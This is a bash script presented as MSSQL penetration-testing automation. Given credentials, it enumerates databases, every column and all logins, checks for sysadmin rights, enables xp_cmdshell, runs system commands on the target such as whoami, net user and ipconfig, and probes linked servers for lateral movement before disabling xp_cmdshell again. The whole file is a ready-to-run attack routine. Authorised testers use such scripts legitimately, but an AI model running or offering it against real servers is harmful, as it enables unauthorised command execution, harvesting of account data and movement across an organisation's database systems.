#!/bin/bash

# MSSQL Penetration Testing Automation Script
# Purpose: Automate penetration testing for MSSQL with valid credentials.


# Ensure all parameters are provided
if [ -z "$1" ] || [ -z "$2" ] || [ -z "$3" ]; then
    echo "Usage: $0 <TARGET_IP_OR_HOSTNAME> <USERNAME> <PASSWORD>"
    exit 1
fi


# Set target variables
TARGET_IP="$1"       # Replace with target MSSQL server IP
USERNAME="$2"         # Replace with MSSQL username
PASSWORD="$3"         # Replace with MSSQL password


## Set logger
LOGDIR=$(basename "$0")
DATE=$(date +'%Y%m%d_%H%M%S')
LOGFILE="./$LOGDIR/$DATE/scan.log"
mkdir -p "./$LOGDIR/$DATE"
exec > >(tee -a "$LOGFILE") 2>&1


# Check if sqlcmd is installed
if ! command -v sqlcmd &>/dev/null; then
    echo "[!] sqlcmd is not installed. Please install it first."
    echo "https://learn.microsoft.com/en-us/sql/linux/sql-server-linux-setup-tools?view=sql-server-ver16&tabs=ubuntu-install"
    exit 1
fi



echo "[+] Checking SQL Server Version..."
sqlcmd -S $TARGET_IP -U $USERNAME -P $PASSWORD -C -Q "SELECT @@version" -W

echo "[+] Enumerating Databases..."
sqlcmd -S $TARGET_IP -U $USERNAME -P $PASSWORD -C -Q "SELECT name FROM master.dbo.sysdatabases" -W
sqlcmd -S $TARGET_IP -U $USERNAME -P $PASSWORD -C -Q "EXEC sp_MSforeachdb 'IF ''?'' NOT IN (''master'',''tempdb'',''model'',''msdb'') BEGIN USE [?]; SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS ORDER BY TABLE_SCHEMA, TABLE_NAME, ORDINAL_POSITION; END'" -W


echo "[+] Enumerating Users..."
sqlcmd -S $TARGET_IP -U $USERNAME -P $PASSWORD -C -Q "SELECT * FROM sys.syslogins" -W

echo "[+] Checking for sysadmin Privileges..."
sqlcmd -S $TARGET_IP -U $USERNAME -P $PASSWORD -C -Q "SELECT IS_SRVROLEMEMBER('sysadmin')" -W

# Enable xp_cmdshell for command execution if user has sysadmin
echo "[+] Enabling xp_cmdshell..."
sqlcmd -S $TARGET_IP -U $USERNAME -P $PASSWORD -C -Q "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;" -W
sqlcmd -S $TARGET_IP -U $USERNAME -P $PASSWORD -C -Q "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;" -W

# Execute a system command (whoami)
echo "[+] Running whoami on the Target..."
sqlcmd -S $TARGET_IP -U $USERNAME -P $PASSWORD -C -Q "EXEC xp_cmdshell 'whoami && systeminfo && net user && ipconfig /all'" -W

# Check for linked servers (useful for lateral movement)
echo "[+] Testing Linked Servers..."
sqlcmd -S $TARGET_IP -U $USERNAME -P $PASSWORD -C -Q "EXEC sp_linkedservers" -W

# Try executing a command via linked server
echo "[+] Checking if linked servers allow remote command execution..."
sqlcmd -S $TARGET_IP -U $USERNAME -P $PASSWORD -C -Q "SELECT * FROM OPENQUERY(\"Linked_Server\", 'SELECT system_user');" -W

# Cleanup by disabling xp_cmdshell
echo "[+] Disabling xp_cmdshell for Cleanup..."
sqlcmd -S $TARGET_IP -U $USERNAME -P $PASSWORD -C -Q "EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;" -W

echo "[+] MSSQL Recon Testing Complete!"
echo "[+] Log file saved to: $LOGFILE"